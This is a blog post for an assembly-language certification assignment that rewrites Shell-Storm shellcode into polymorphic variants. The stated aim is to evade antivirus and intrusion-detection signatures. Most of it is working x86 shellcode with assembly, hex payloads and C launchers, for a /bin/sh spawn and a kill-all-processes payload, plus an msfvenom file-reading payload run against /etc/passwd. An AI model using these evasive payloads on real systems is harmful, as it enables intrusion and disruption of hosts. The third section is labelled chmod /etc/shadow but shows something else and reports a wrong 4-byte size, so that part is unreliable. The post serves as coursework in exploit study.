---
title:  "SLAE x86 Assignment 6: Polymorphic Shellcode"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

### Polymorphic Shellcode
------

* Analyze 3 shellcodes from Shell-Storm, and create polymorphic versions to evade pattern matching
* The polymorphic versions should not be larger than 150% of the original shellcode

#### Concept 
-----

Polymorphism is a method used to alter existing shellcode, with the intention of evading pattern matching whilst still preserving the intended functionality as common AV and IDS systems rely on the fingerprint of patterns, and signatures found within malicious code.

Evasion techniques used in polymorphic shellcodes include symantics of command instructions, use of different arithmetic functions and methods, changing the order of instructions as well as adding/removing instructions.

Polymorphic encoders such as Shikata-Ga-Nai can be used in this scenario to evade security controls, using these evasion techniques results in the code appearing completely different and benign, often bypassing signature based detection mechanisms.

![Polymorphic](/assets/images/polymorphic.jpg)

The 3 Shell-Storm references that will be modified:

* Execve <code class="language-plaintext highlighter-rouge">/bin/sh</code> 
* <code class="language-plaintext highlighter-rouge">killall</code> processes 
* Chmod <code class="language-plaintext highlighter-rouge">/etc/shadow</code>  

#### 1st Shellcode (Execve /bin/sh)
--------

The Execve shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host. 

Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-811.php] [execve-shellstorm]:

```c
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 28 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc execve.c -o execve -z execstack
execve.c: In function 'main':
execve.c:36:33: warning: incompatible implicit declaration of built-in function 'strlen' [enabled by default]
osboxes@osboxes:~/Downloads/SLAE/$ ls
execve  execve.c
osboxes@osboxes:~/Downloads/SLAE$ ./execve 
Lenght: 28
$ 

```

The polymorphic (modified) version of the original shellcode is scripted in Assembly:

```nasm
; Filename: execve_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Spawn a shell on the local host
; Compilation: ./compile.sh execve_poly
; Usage: ./execve_poly
; Shellcode size: 37 bytes
; Architecture: x86

global   _start

section .text
        _start:

        xor edx, edx                    ; initialize register // changed the register value
        push edx                        ; push edx onto the stack // changed the register value
        mov eax, 0x463ED8B7             ; move 0x463ED8B7 into eax // split to add up to original value /bin/sh
        add eax, 0x22345678             ; move 0x22345678 into eax // split to add up to original value /bin/sh
        push eax                        ; push eax onto the stack // added instruction
        mov eax, 0xDEADC0DE             ; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
        sub eax, 0x70445EAF             ; move 0x70445EAF into eax // split to add up to original value /bin/sh
        push eax                        ; push eax onto the stack // added instruction
        push byte 0xb                   ; push 0xb onto the stack // changed the method
        pop eax                         ; pop eax off the stack // added instruction
        mov ecx, edx                    ; move edx into ecx // changed the register value
        mov ebx, esp                    ; move esp into ebx // changed the order
        push byte 0x1                   ; push 0x1 onto the stack // added instruction
        pop esi                         ; pop esi off the stack // added instruction
        int 0x80                        ; call the interrupt to execute the execve syscall, /bin/sh shell
```

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh execve_poly
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

The compiled binary is executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly 
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ 
```

Objdump is used to extract the shellcode from the Execve shell in hex format (Null free):


```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./execve_poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80"
```

A C program scripted with the newly generated shellcode:

```c 
/**
* Filename: execve_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Spawn a shell on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
* Usage: ./execve_poly_final
* Shellcode size: 37 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad"
"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80";

int main()
{
        printf("Shellcode length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 37 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly_final 
Shellcode length:  37
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ 
```

The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.

#### 2nd Shellcode (Killall Processes)
--------------

A <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.

Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-212.php] [killall-shellstorm]:

```c
/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}
```

The polymorphic (modified) version of the original shellcode is scripted in Assembly:

```nasm 
; Filename: killall_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Terminates processes running on the local host
; Compilation: ./compile.sh killall_poly
; Usage: ./killall_poly
; Shellcode size: 15 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub eax, eax			; initialize register // added instruction
	mov al, 0x25			; move 0x25 into al // changed the method
	sub ebx, ebx			; initialize register // added instruction
	dec ebx				; decrement ebx // replaced push 0xffffffff
	sub ecx, ecx			; initialize register // added instruction
	mov cl, 0xf7			; move 0xf7 intocl // added instruction
	neg cl				; negates 0xf7 // added instruction
	int 0x80			; call the interrupt to execute the syscall
```

The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.

Objdump is used to extract the shellcode from the <code class="language-plaintext highlighter-rouge">killall</code> command in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./killall_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80"
```

A C program scripted with the newly generated shellcode:

```c 
/**
* Filename: killall_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Terminates processes running on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 killall_poly_shellcode.c -o killall_poly_final
* Usage: ./killall_poly_final
* Shellcode size: 15 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80";

int main()
{
        printf("Shellcode length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./killall_poly_final Connection to 192.168.0.142 closed by remote host.
Connection to 192.168.0.142 closed.
```

The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.

#### 3rd Shellcode (chmod 0777 /etc/shadow)
--------------

The Read File payload reads a chosen file as specified, requiring 2 arguments, the file descriptor to write the output to (standard output), and the <code class="language-plaintext highlighter-rouge">PATH</code> to the file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes
Final size of c file: 331 bytes
unsigned char buf[] = 
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";
```

A C program scripted with the newly generated shellcode:

```c
/**
* Filename: readfile_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Read a specified file on the local host  
* Compilation: gcc -fno-stack-protector -z execstack -m32 readfile_shellcode.c -o readfile  
* Usage: ./readfile
* Shellcode size: 4 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";

int main()
{
        printf("Shellcode length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 4 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack readfile_shellcode.c -o readfile
osboxes@osboxes:~/Downloads/SLAE$ ./readfile 
Shellcode length:  4
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/bash
```

The Ndisasm tool (similar to GDB) is used to step through the program code and analyze the system calls:

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/read_file PATH=/etc/passwd --arch x86 --platform linux | ndisasm -u -
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes

00000000  EB36		jmp short 0x38		        ; jmp to address 0x38 (jmp, call, pop)
00000002  B805000000    mov eax,0x5			; open syscall = 0x5
00000007  5B            pop ebx				; pop address of /etc/passwd into ebx
00000008  31C9          xor ecx,ecx			; zeroize ecx register, open file as O_RDONLY
0000000A  CD80          int 0x80			; call the interrupt to execute the open syscall
0000000C  89C3          mov ebx,eax			; move eax into ebx (0x5)
0000000E  B803000000    mov eax,0x3			; read syscall = 0x3
00000013  89E7          mov edi,esp			; move stack pointer into edi
00000015  89F9          mov ecx,edi			; move stack pointer into ecx
00000017  BA00100000    mov edx,0x1000		        ; move 0x1000 (4096) into edx 
0000001C  CD80          int 0x80			; call the interrupt to execute the read syscall
0000001E  89C2          mov edx,eax			; size of read data
00000020  B804000000    mov eax,0x4			; write syscall = 0x4 
00000025  BB01000000    mov ebx,0x1			; move 0x1 (stdout) into ebx stdout
0000002A  CD80          int 0x80			; call the interrupt to execute the write syscall 
0000002C  B801000000    mov eax,0x1			; exit syscall = 0x1
00000031  BB00000000    mov ebx,0x0			; move 0 (exit/return code) into ebx
00000036  CD80          int 0x80			; call the interrupt to execute the exit syscall
00000038  E8C5FFFFFF    call 0x2			; jmp up, put next instruction onto the stack
0000003D  2F            das				; read the file contents (/etc/passwd)
0000003E  657463        gs jz 0xa4
00000041  2F            das
00000042  7061          jo 0xa5
00000044  7373          jnc 0xb9
00000046  7764          ja 0xac
00000048  00            db 0x00
```

The disassembled code consists of the following components:

* open syscall -> <code class="language-plaintext highlighter-rouge">0x5</code>
* read syscall -> <code class="language-plaintext highlighter-rouge">0x3</code>
* write syscall -> <code class="language-plaintext highlighter-rouge">0x4</code>
* exit syscall -> <code class="language-plaintext highlighter-rouge">0x1</code>

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment6
[execve-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-811.php
[killall-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-212.php
